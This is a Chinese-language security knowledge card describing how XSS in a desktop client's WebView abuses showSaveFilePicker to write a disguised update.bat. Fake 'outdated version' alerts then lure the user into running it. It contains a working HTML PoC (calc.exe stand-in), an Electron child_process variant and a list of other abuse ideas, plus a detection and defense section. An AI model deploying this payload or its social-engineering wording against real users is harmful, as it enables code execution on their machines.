---
id: desktop-client-xss-showsavefilepicker-bat-rce
title: PC 客户端 XSS 借 showSaveFilePicker 写伪装 update.bat 诱导用户执行获得代码执行
type: scenario
domain: web
path: web/generic/xss
technique: 桌面客户端内嵌 WebView 中的 XSS 调用 File System Access API 的 window.showSaveFilePicker，以 update.bat 伪装名与 application/bat MIME 欺骗写入恶意批处理，再用 confirm/alert 社工话术诱导用户保存并运行，实现需交互的代码执行（原文实测弹计算器）
aliases:
- 客户端 XSS 到 RCE
- showSaveFilePicker 写文件
- XSS 写 bat 文件
tags:
- xss
- desktop-client
- webview
- file-system-access-api
- showSaveFilePicker
- social-engineering
- rce
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-33
  verified_at: '2026-11-08T17:18:47+08:00'
  notes: 已对照原文核对：showSaveFilePicker 写 update.bat 载荷与原文逐字一致，img03 系统保存框（update.bat/Windows Batch File）、img04/08 运行 bat 后弹出计算器、img05-07 版本过旧社工话术弹窗，全链证据齐全且原文明确为需用户两次交互的曲线救国链非无感RCE；原文确认客户端非 Electron，Electron 分支仅作背景罗列不立卡合理；dedup 与 Electron IPC 卡不同链
---

# 一句话结论

非 Electron（无 nodeIntegration）的 PC 桌面客户端存在 XSS 时，可用 File System Access API：XSS 触发 `window.showSaveFilePicker({suggestedName:'update.bat',types:[{accept:{'application/bat':['.bat']}}]})` 弹出系统保存框，写入 `start /min calc.exe` 等命令，配合"版本过旧请更新"弹窗话术诱导用户保存并双击运行，最终执行任意命令（原文在 Windows 客户端实测弹出计算器）；这是无 nodeIntegration 时的替代"曲线救国"利用链。

# 原理

为什么成立：

1. 桌面客户端内嵌 Chromium WebView 渲染用户可控内容，XSS payload（冷门事件类）在客户端上下文执行后拥有页面 JS 全部能力，包括 File System Access API。
2. `showSaveFilePicker` 是浏览器/WebView 层 API，可指定默认文件名与扩展名：`suggestedName: 'update.bat'` 利用系统更新文件命名习惯降低戒心；`types` 声明 `application/bat` + `.bat` 锁定可执行扩展名，同时用非常规 MIME 绕过按 text/plain 等做的类型过滤。
3. `f.createWritable()` + `w.write()` 流式写入恶意内容，`w.close()` 落盘；`start /min calc.exe` 最小化启动，验证命令执行。实际攻击可替换为免杀脚本下载器/反弹 shell。
4. 该 API 本身需用户在系统保存对话框确认（Chromium 安全设计，脚本无法静默写任意路径），因此链路依赖用户"保存"与"运行"两次交互——通过 alert/confirm 单按钮弹窗（"当前版本过旧，可能存在漏洞风险，请下载更新程序"→"更新程序下载完成，请运行程序自动更新"）把交互伪装成常规更新流程，提高成功率。
5. 若客户端是 Electron 且 nodeIntegration 未关闭，可直接 `require('child_process').exec()` 无感 RCE；本文场景已确认非 Electron，故退而求其次。

# 触发条件

- PC 桌面客户端用 Chromium 内核 WebView 渲染用户可控数据（命令记录、笔记、日志等），且存在 XSS（如未过滤冷门事件属性）。
- 客户端非 Electron 或 nodeIntegration 已禁用（Electron 未禁用时可直接 RCE，无需此链）。
- 用户会被诱导完成两次交互：点击保存对话框保存 bat、手动运行 bat。
- 目标为 Windows（bat 可执行）；跨平台场景可换 .command(macOS)/.sh。

# 利用步骤

1. 注入 XSS 入口：`<input style="content-visibility:auto" oncontentvisibilityautostatechange="...">`（冷门事件绕过过滤器）。
2. 弹窗制造紧迫感：`alert('当前版本过旧，可能存在漏洞风险，请下载更新程序更新到最新版本！')`，用户只有确定按钮。
3. 调 `window.showSaveFilePicker({suggestedName:'update.bat',types:[{accept:{'application/bat':['.bat']}}]})` 弹系统保存框，诱导用户点保存。
4. `createWritable()` 流式写入 `start /min calc.exe`（实际替换为免杀载荷），`close()` 落盘。
5. 再弹 `alert('更新程序下载完成，请运行程序自动更新！')` 诱导用户运行 update.bat，命令执行。

# PoC

```html
<input style="content-visibility:auto"
  oncontentvisibilityautostatechange="(async()=>{
    alert('当前版本过旧，可能存在漏洞风险，请下载更新程序更新到最新版本！');
    const f=await window.showSaveFilePicker({suggestedName:'update.bat',types:[{accept:{'application/bat':['.bat']}}]});
    const w=await f.createWritable();
    await w.write('start /min calc.exe');
    await w.close();
    alert('更新程序下载完成，请运行程序自动更新！');
  })()">
```

原文在 Windows PC 客户端（记事本类工具，localhost 页面）实测：触发 XSS → 保存 update.bat → 用户运行 → 计算器弹出，全链成功。

# 变体与关联

- Electron 且未禁 nodeIntegration：`oncontentvisibilityautostatechange="require('child_process').exec('calc.exe')"` 直接无感 RCE，无需交互。
- 可替换文件类型与话术：.ps1/.vbs/.hta、伪造"配置导出""日志下载"等。
- 客户端 XSS 的其他利用面：file:// 读本地文件/窃取 localStorage、剪贴板劫持篡改钱包地址、getUserMedia 调用摄像头、自定义协议 deep link 横向、WebRTC 内网探测、自动更新劫持等。
- 关联：冷门事件 XSS 绕过（入口卡）、File System Access API 滥用、客户端社工钓鱼。

# 检测与防御

- 检测：客户端 WebView 内监控 showSaveFilePicker/createWritable 调用并按可执行扩展名告警；RASP 拦截 WebView 页面发起的 bat/脚本类文件写入；审计客户端渲染内容中的 on* 事件属性。
- 防御：客户端对渲染内容做输出编码/白名单过滤，禁用内联事件（CSP script-src-attr）；WebView 关闭或限制 File System Access API（拦截 showSaveFilePicker）；对更新类弹窗做产品化改造，杜绝页面 JS 弹窗承担更新提示职责；用户教育：更新提示应来自应用内固定 UI 而非页面弹窗。
